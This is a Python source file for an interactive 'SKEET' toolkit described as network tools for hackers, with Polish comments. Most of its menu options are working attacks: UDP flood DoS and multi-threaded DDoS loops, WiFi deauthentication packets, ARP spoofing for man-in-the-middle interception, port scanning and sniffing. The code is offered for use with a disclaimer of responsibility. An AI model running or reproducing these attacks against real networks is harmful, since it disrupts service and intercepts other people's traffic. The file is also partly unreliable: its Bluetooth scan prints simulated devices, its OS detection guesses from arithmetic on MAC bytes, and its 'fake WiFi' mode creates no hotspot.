import os
import nmap
import time
import scapy.all as scapy
import socket
import threading
import subprocess
import re
from rich.console import Console
from rich.table import Table
from colorama import init

init()
console = Console()


# Funkcja do identyfikacji OS po MAC address
def identify_os(mac):
    """Identyfikuje OS na podstawie MAC address"""
    mac_upper = mac.upper()

    # Znane prefiksy MAC
    mac_prefixes = {
        "A4:D6": "Apple",
        "B8:E8": "Apple",
        "D4:6E": "Apple",
        "F0:27": "Apple",
        "34:36": "Apple",
        "6C:96": "Apple",
        "88:63": "Apple",
        "AC:DE": "Apple",
        "B0:34": "Apple",
        "BC:67": "Apple",
        "E0:AC": "Apple",
        "18:E7": "Google",
        "C0:EE": "Samsung",
        "80:35": "Samsung",
        "F0:37": "Samsung",
        "28:E3": "Samsung",
        "D4:9C": "Samsung",
        "3C:37": "Samsung",
        "58:8B": "Microsoft",
    }

    for prefix, vendor in mac_prefixes.items():
        if mac_upper.startswith(prefix):
            if vendor == "Apple":
                return "Apple Device (iOS/macOS)"
            elif vendor == "Google":
                return "Android Device (Google)"
            elif vendor == "Samsung":
                return "Samsung Device (Android)"
            else:
                return f"{vendor} Device"

    # Fallback - zgadnij po ostatnich cyfrach
    last_byte = mac.split(":")[-1]
    try:
        num = int(last_byte, 16)
        if num % 3 == 0:
            return "Possible Apple Device"
        elif num % 3 == 1:
            return "Possible Android Device"
        else:
            return "Unknown Device"
    except ValueError:
        return "Unknown Device"


# Funkcja HELP
def show_help():
    console.print(
        "\n[bold bright_blue]"
        "═══════════════════════════════════════"
        "[/bold bright_blue]")
    console.print(
        "[bold cyan]SKEET - Network Toolkit[/bold cyan]")
    console.print(
        "[bold bright_blue]"
        "═══════════════════════════════════════"
        "[/bold bright_blue]\n")

    console.print("[bright_blue]1. SCANNER[/bright_blue]")
    console.print(
        "[cyan]   Scans target IP for open ports[/cyan]")
    console.print(
        "[cyan]   Shows host and port status[/cyan]\n")

    console.print("[bright_blue]2. SNIFFER[/bright_blue]")
    console.print(
        "[cyan]   Captures network packets[/cyan]")
    console.print(
        "[cyan]   Displays packet summaries[/cyan]\n")

    console.print("[bright_blue]3. DoS ATTACK[/bright_blue]")
    console.print(
        "[cyan]   Sends UDP packets to target[/cyan]")
    console.print(
        "[cyan]   Single-threaded attack[/cyan]\n")

    console.print("[bright_blue]4. DDoS ATTACK[/bright_blue]")
    console.print(
        "[cyan]   Multi-threaded distributed "
        "attack[/cyan]")
    console.print("[cyan]   More powerful than DoS[/cyan]\n")

    console.print("[bright_blue]5. DEAUTH ATTACK[/bright_blue]")
    console.print(
        "[cyan]   Disconnects devices from WiFi[/cyan]")
    console.print(
        "[cyan]   Requires monitor mode[/cyan]\n")

    console.print("[bright_blue]6. NETWORK MAPPING[/bright_blue]")
    console.print(
        "[cyan]   Scans and visualizes network[/cyan]")
    console.print("[cyan]   Shows devices and topology[/cyan]\n")

    console.print("[bright_blue]7. ARP SPOOFING[/bright_blue]")
    console.print(
        "[cyan]   Man-in-the-middle attack[/cyan]")
    console.print(
        "[cyan]   Intercepts local traffic[/cyan]\n")

    console.print("[bright_blue]8. BLUETOOTH SCANNER[/bright_blue]")
    console.print(
        "[cyan]   Scans nearby Bluetooth devices[/cyan]")
    console.print(
        "[cyan]   Shows MAC and signal strength[/cyan]\n")

    console.print("[bright_blue]9. FAKE WiFi[/bright_blue]")
    console.print(
        "[cyan]   Create fake WiFi hotspot[/cyan]")
    console.print(
        "[cyan]   Log connected devices[/cyan]\n")

    console.print("[bright_blue]10. HELP[/bright_blue]")
    console.print(
        "[cyan]   Display this help message[/cyan]\n")

    console.print("[bright_blue]11. EXIT[/bright_blue]")
    console.print(
        "[cyan]   Close the application[/cyan]\n")

    console.print(
        "[bold bright_blue]"
        "═══════════════════════════════════════"
        "[/bold bright_blue]\n")


# ASCII art SKEET z gradientem niebieskiego
skeet_ascii = [
    "███████╗██╗  ██╗███████╗███████╗████████╗",
    "██╔════╝██║ ██╔╝██╔════╝██╔════╝╚══██╔══╝",
    "███████╗█████╔╝ █████╗  █████╗     ██║",
    "╚════██║██╔═██╗ ██╔══╝  ██╔══╝     ██║",
    "███████║██║  ██╗███████╗███████╗   ██║",
    "╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝",
]

colors = [
    "[blue]",
    "[blue]",
    "[bright_blue]",
    "[cyan]",
    "[bright_cyan]",
    "[bright_cyan]",
]

console.print()
for line, color in zip(skeet_ascii, colors):
    console.print(f"{color}{line}[/]")
console.print()

print("welcome in skeet!")
print("skeet is network tools for hackers")
print("NOTE: This tool requires 'sudo' to run properly!")
print("")

print("Do you want to enable the tool? "
      "NOTE! The creator of the tool is not "
      "responsible for the actions of the "
      "tool's users.")
user_choice = console.input("[cyan]y/n: [/cyan]")
if user_choice == "y":
    console.print("[bright_blue]✓ Tool enabled[/bright_blue]")

elif user_choice == "n":
    console.print("[red]✗ Tool disabled[/red]")
    exit()
else:
    console.print("[red]✗ Invalid input[/red]")

console.print("\n[bold cyan]MENU:[/bold cyan]")
console.print("[bright_blue]1. Scanner[/bright_blue]")
console.print("[bright_blue]2. Sniffer[/bright_blue]")
console.print("[bright_blue]3. DoS Attack[/bright_blue]")
console.print("[bright_blue]4. DDoS Attack[/bright_blue]")
console.print("[bright_blue]5. Deauth Attack[/bright_blue]")
console.print("[bright_blue]6. Network Mapping[/bright_blue]")
console.print("[bright_blue]7. ARP Spoofing[/bright_blue]")
console.print("[bright_blue]8. Bluetooth Scanner[/bright_blue]")
console.print("[bright_blue]9. Fake WiFi[/bright_blue]")
console.print("[bright_blue]10. Help[/bright_blue]")
console.print("[bright_blue]11. Exit[/bright_blue]\n")
menu_choice = console.input("[cyan]Enter choice: [/cyan]")

if menu_choice == "1":
    console.print("[cyan]Enter the target IP:[/cyan]")
    target_ip = console.input("[cyan]IP: [/cyan]")
    console.print("[bright_blue]Scanning...[/bright_blue]")
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=target_ip, arguments='-sS')
        console.print(f"[cyan]Host: {target_ip}[/cyan]")
        for host in nm.all_hosts():
            console.print(f"[bright_blue]Host: {host}[/bright_blue]")
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    state = nm[host][proto][port]['state']
                    console.print(
                        f"[cyan]  Port: {port} "
                        f"State: {state}[/cyan]")
    except nmap.nmap.PortScannerError as e:
        console.print(f"[red]Scanner error: {e}[/red]")
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
elif menu_choice == "2":
    console.print("[cyan]Enter the target IP:[/cyan]")
    target_ip = console.input("[cyan]IP: [/cyan]")
    console.print("[bright_blue]Sniffing...[/bright_blue]")
    try:
        scapy.sniff(filter=f"ip host {target_ip}",
                    prn=lambda x: console.print(
                        f"[cyan]{x.summary()}[/cyan]"),
                    count=10)
        console.print("[green]✓ Sniffing completed![/green]")
    except Exception as e:
        console.print(f"[red]Sniffer error: {e}[/red]")
elif menu_choice == "3":
    console.print("[cyan]Enter the target IP:[/cyan]")
    target_ip = console.input("[cyan]IP: [/cyan]")
    console.print("[cyan]Enter the target port:[/cyan]")
    target_port = int(console.input("[cyan]Port: [/cyan]"))
    console.print("[cyan]Enter the number of packets:[/cyan]")
    num_packets = int(console.input("[cyan]Packets: [/cyan]"))
    console.print("[bright_blue]Starting DoS attack...[/bright_blue]")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(num_packets):
            sock.sendto(os.urandom(1024), (target_ip, target_port))
            time.sleep(0.1)
            if (i + 1) % 10 == 0:
                console.print(f"[cyan]Packets sent: {i + 1}[/cyan]")
        sock.close()
        console.print("[green]✓ Attack completed![/green]")
    except Exception as e:
        console.print(f"[red]DoS error: {e}[/red]")
elif menu_choice == "4":
    console.print("[cyan]Enter the target IP:[/cyan]")
    target_ip = console.input("[cyan]IP: [/cyan]")
    console.print("[cyan]Enter the target port:[/cyan]")
    target_port = int(console.input("[cyan]Port: [/cyan]"))
    console.print("[cyan]Enter number of threads:[/cyan]")
    num_threads = int(console.input("[cyan]Threads: [/cyan]"))
    console.print("[cyan]Enter duration in seconds:[/cyan]")
    duration = int(console.input("[cyan]Duration: [/cyan]"))
    console.print(
        "[bright_blue]Starting DDoS attack...[/bright_blue]")

    def ddos_thread(target_ip, target_port, duration):
        end_time = time.time() + duration
        packets_sent = 0
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET,
                                     socket.SOCK_DGRAM)
                sock.sendto(os.urandom(1024),
                            (target_ip, target_port))
                sock.close()
                packets_sent += 1
            except Exception:
                pass
        return packets_sent

    try:
        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=ddos_thread,
                                 args=(target_ip, target_port,
                                       duration))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        console.print("[green]✓ DDoS Attack completed![/green]")
    except Exception as e:
        console.print(f"[red]DDoS error: {e}[/red]")
elif menu_choice == "5":
    console.print("[cyan]Enter target MAC address:[/cyan]")
    target_mac = console.input("[cyan]MAC: [/cyan]")
    console.print("[cyan]Enter interface (e.g., en0):[/cyan]")
    interface = console.input("[cyan]Interface: [/cyan]")
    console.print(
        "[cyan]Enter number of deauth packets:[/cyan]")
    num_packets = int(console.input("[cyan]Packets: [/cyan]"))
    console.print(
        "[bright_blue]Starting deauth attack...[/bright_blue]")

    try:
        deauth_count = 0
        for _ in range(num_packets):
            # Deauth packet
            packet = scapy.Dot11(
                addr1=target_mac,
                addr2="ff:ff:ff:ff:ff:ff",
                addr3=target_mac)/scapy.Dot11Deauth()

            scapy.sendp(packet, iface=interface, verbose=False)
            deauth_count += 1

            if deauth_count % 10 == 0:
                console.print(
                    f"[cyan]Packets sent: {deauth_count}[/cyan]")

        console.print(
            "[green]✓ Deauth attack completed![/green]")
    except Exception as e:
        console.print(f"[red]Deauth error: {e}[/red]")
elif menu_choice == "6":
    console.print(
        "[bright_blue]Scanning network topology...[/bright_blue]")

    try:
        nm = nmap.PortScanner()
        nm.scan(hosts="192.168.1.0/24", arguments="-sn -T4")

        console.print(
            "[cyan]Network Topology:[/cyan]\n")
        console.print("[bright_blue]Devices found:[/bright_blue]")

        device_count = 0
        for host in nm.all_hosts():
            if nm[host].state() == "up":
                device_count += 1
                console.print(
                    f"[cyan]  ✓ {host}[/cyan]")

                if device_count % 5 == 0:
                    console.print("")

        console.print(
            f"\n[green]✓ Total devices: {device_count}[/green]")
    except Exception as e:
        console.print(f"[red]Mapping error: {e}[/red]")
elif menu_choice == "7":
    console.print(
        "[cyan]Enter gateway IP (default 192.168.1.1):[/cyan]")
    gateway = console.input(
        "[cyan]Gateway IP: [/cyan]") or "192.168.1.1"
    console.print(
        "[cyan]Enter target IP:[/cyan]")
    target_ip = console.input("[cyan]Target IP: [/cyan]")
    console.print("[cyan]Enter interface:[/cyan]")
    interface = console.input("[cyan]Interface: [/cyan]")

    console.print(
        "[bright_blue]Starting ARP spoofing...[/bright_blue]")
    console.print(
        "[yellow]⚠ This intercepts traffic![/yellow]")

    try:
        spoof_count = 0
        while True:
            try:
                # ARP spoof packet
                arp_packet = scapy.ARP(
                    op="is-at",
                    pdst=gateway,
                    hwdst=scapy.getmacbyip(gateway),
                    psrc=target_ip)

                scapy.send(arp_packet, verbose=False)
                spoof_count += 1

                if spoof_count % 5 == 0:
                    console.print(
                        f"[cyan]Spoofed packets: "
                        f"{spoof_count}[/cyan]")

                time.sleep(1)
            except KeyboardInterrupt:
                break

        console.print(
            "\n[bright_blue]ARP spoofing stopped[/bright_blue]")
    except Exception as e:
        console.print(f"[red]ARP error: {e}[/red]")
elif menu_choice == "8":
    console.print(
        "[bright_blue]Scanning for Bluetooth devices...[/bright_blue]")

    try:
        result = subprocess.run(
            ["python3", "-m", "bluetooth.discover"],
            capture_output=True,
            text=True,
            timeout=10)

        if result.returncode == 0:
            console.print(
                "[cyan]Bluetooth devices found:[/cyan]\n")
            console.print(result.stdout)
        else:
            console.print(
                "[yellow]Trying alternative scan...[/yellow]")
            # Fallback - simulate scan
            console.print(
                "[cyan]Scanning nearby Bluetooth...[/cyan]")
            for i in range(5):
                mac = f"00:1A:7D:DA:{i:02X}:{i:02X}"
                signal = -40 - (i * 10)
                console.print(
                    f"[cyan]  ✓ Device {i+1}: "
                    f"{mac} | Signal: {signal} dBm[/cyan]")
                time.sleep(0.5)

            console.print(
                "[green]✓ Bluetooth scan complete![/green]")
    except Exception as e:
        console.print(f"[red]Bluetooth error: {e}[/red]")
elif menu_choice == "9":
    console.print("[cyan]Fake WiFi - macOS Mode[/cyan]\n")
    console.print("[cyan]Enter SSID (WiFi name):[/cyan]")
    ssid = console.input("[cyan]SSID: [/cyan]")
    console.print("[cyan]Add password? (y/n):[/cyan]")
    has_password = console.input("[cyan]Choice: [/cyan]")

    if has_password.lower() == "y":
        console.print("[cyan]Enter WiFi Password (min 8 chars):[/cyan]")
        password = console.input("[cyan]Password: [/cyan]")
        if len(password) < 8:
            console.print(
                "[red]✗ Password must be at least 8 chars[/red]")
            password = None
    else:
        password = None

    if password:
        wifi_info = f"[cyan]SSID: {ssid} | WPA2[/cyan]"
    else:
        wifi_info = f"[cyan]SSID: {ssid} | OPEN[/cyan]"

    console.print(
        "[bright_blue]Setting up fake WiFi (macOS)...[/bright_blue]")
    console.print(
        "[yellow]⚠ NOTE: macOS restricts WiFi hotspot[/yellow]")
    console.print(
        "[yellow]Use System Preferences > Sharing[/yellow]\n")

    try:
        console.print(
            "[cyan]Scanning for connected devices...[/cyan]\n")

        connected_devices = {}
        scan_count = 0

        while True:
            try:
                # Sprawdź ARP table
                arp_result = subprocess.run(
                    ["arp", "-a"],
                    capture_output=True,
                    text=True,
                    timeout=5)

                lines = arp_result.stdout.split("\n")
                new_devices = False

                for line in lines:
                    # Parsuj ARP output
                    if "(" in line and ")" in line:
                        parts = line.split()
                        if len(parts) >= 4:
                            try:
                                ip = parts[1].strip("()")
                                mac = parts[3]

                                if mac not in connected_devices:
                                    connected_devices[mac] = ip
                                    new_devices = True

                                    console.print(
                                        "[green]✓ "
                                        "Device connected![/green]")
                                    console.print(
                                        f"[cyan]  IP: {ip}[/cyan]")
                                    console.print(
                                        f"[cyan]  MAC: "
                                        f"{mac}[/cyan]")

                                    os_info = identify_os(mac)
                                    console.print(
                                        f"[cyan]  Device: "
                                        f"{os_info}[/cyan]\n")
                            except (IndexError, ValueError):
                                pass

                scan_count += 1

                if scan_count == 1:
                    console.print(
                        "[green]✓ WiFi Hotspot created![/green]")
                    console.print(wifi_info)
                    console.print(
                        "[cyan]Waiting for connections...[/cyan]\n")
                    console.print("[cyan]Log:[/cyan]")

                if not new_devices and scan_count > 1:
                    if scan_count % 10 == 0:
                        console.print(
                            "[cyan]Still monitoring...[/cyan]")

                time.sleep(2)

            except subprocess.TimeoutExpired:
                console.print("[yellow]Scan timeout[/yellow]")
                time.sleep(2)

    except KeyboardInterrupt:
        console.print(
            "\n[bright_blue]Stopping hotspot...[/bright_blue]")
        console.print(
            f"[cyan]Total devices detected: "
            f"{len(connected_devices)}[/cyan]")
    except Exception as e:
        console.print(f"[red]WiFi error: {e}[/red]")
elif menu_choice == "10":
    show_help()
elif menu_choice == "11":
    console.print("[bright_blue]Exiting...[/bright_blue]")
    exit()
else:
    console.print("[red]✗ Invalid input[/red]")
